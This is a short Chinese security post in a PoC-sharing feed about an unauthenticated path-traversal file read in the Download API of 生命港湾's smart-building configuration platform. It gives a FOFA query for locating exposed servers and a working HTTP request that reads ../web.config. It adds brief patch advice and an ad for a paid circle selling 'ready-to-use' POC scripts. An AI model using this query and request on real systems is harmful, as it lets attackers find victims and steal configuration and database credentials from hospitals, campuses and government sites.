#  生命港湾 服务配置工具平台 Download 任意文件读取漏洞   
Superhero  nday POC   2025-01-05 14:06  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJECe5vg2C5YWgpyo1D5bCkYN4sZibCVo6EFo0N9b7Kib4I4N6j6Y10tynLOdgov9ibUmaNwW5yeoCbQ/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJECe5vg2C5YWgpyo1D5bCkhic5lbbPcpxTLtLccZ04WhwDotW7g2b3zBgZeS5uvFH4dxf0tj0Rutw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJECe5vg2C5YWgpyo1D5bCk524CiapZejYicic1Hf8LPt8qR893A3IP38J3NMmskDZjyqNkShewpibEfA/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
内容仅用于学习交流自查使用，由于传播、利用本公众号所提供的  
POC  
信息及  
POC对应脚本  
而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号nday poc及作者不为此承担任何责任，一旦造成后果请自行承担！如文章有侵权烦请及时告知，我们会立即删除文章并致歉。谢谢！  
  
  
**00******  
  
**产品简介**  
  
  
安徽生命港湾信息技术有限公司  
（以下简称“生命港湾”）是一家专注于智能建筑领域的高新技术企业，其服务配置工具平台产品是其核心业务之一。生命港湾的服务配置工具平台是一款专为智能建筑打造的综合管理平台，旨在实现楼宇、工厂等建筑的智慧化管理。该平台通过集成多种智能设备和系统，提供全方位、全天候的监测和控制功能，使建筑更加智能化、高效化。广泛应用于医院、园区、教育、政务、轨道交通等行业，为这些行业提供智慧建筑全生态解决方案。通过该平台，用户可以实现建筑的智能化管理，提高管理效率，降低运营成本。  
**01******  
  
**漏洞概述**  
  
  
生命港湾服务配置工具平台 Download 接口存在任意文件读取  
漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。  
**02******  
  
**搜索引擎**  
  
  
FOFA:  
```
body="css/markdown.css" && body="icon-512.png"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwJUoX2N2TNUnpXWymXkiaYIXcgBAiatQ0PA4F5ciaCsYBYkZqvUNNZ0NaruWIsaiciaWKia7LOJgCF80yaw/640?wx_fmt=png&from=appmsg "")  
  
  
**03******  
  
**漏洞复现**  
```
GET /api/File/Download?file=../web.config HTTP/1.1
Host: 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Priority: u=0, i
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwJUoX2N2TNUnpXWymXkiaYIXUoicj1CBObVdsx9LKmSCq86SKQR8smu78ibjIiaNoIgoGw3fUl4Mgw1HQ/640?wx_fmt=png&from=appmsg "")  
  
  
**04**  
  
**检测工具**  
  
  
nuclei  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwJUoX2N2TNUnpXWymXkiaYIXZSyuRl1eQVGLNI2b9Lg01RrCoLV6LIJEPm20He07ib31IOda8ljM9pQ/640?wx_fmt=png&from=appmsg "")  
  
afrog  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwJUoX2N2TNUnpXWymXkiaYIXPdCgY4Ad3kQ8CVO41QUPicgeya6wUaIP4kjPgib294d6eRfaW2NWC7jA/640?wx_fmt=png&from=appmsg "")  
  
xray  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwJUoX2N2TNUnpXWymXkiaYIX5pqjcXHJ2TjdQsCBuo55Dh7KwQMjgsfmas6mcOgcjqYZ4CEhl2cavg/640?wx_fmt=png&from=appmsg "")  
  
  
**05******  
  
**修复建议**  
  
  
1、关闭互联网暴露面或接口设置访问权限  
  
2、升级至安全版本  
  
  
**06******  
  
**内部圈子介绍**  
  
  
1、本圈子主要是分享网上公布的1day/nday POC详情及对应检测脚本，目前POC脚本均支持xray、afrog、nuclei等三款常用工具。  
  
2、三款工具都支持内置poc+自写poc目录一起扫描。  
  
3、保持每周更新10个左右POC。  
  
4、所发布的POC脚本均已测试完毕，直接拿来即用。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwI0X77l5WtnpfTexA6RwHXSbf1x3ZyT3bhcbWzRoFLyAgHkSMk9yGaZK5FDGcSCQp9ibPcicxHXIOcg/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&retryload=2&tp=webp "")  
  
  
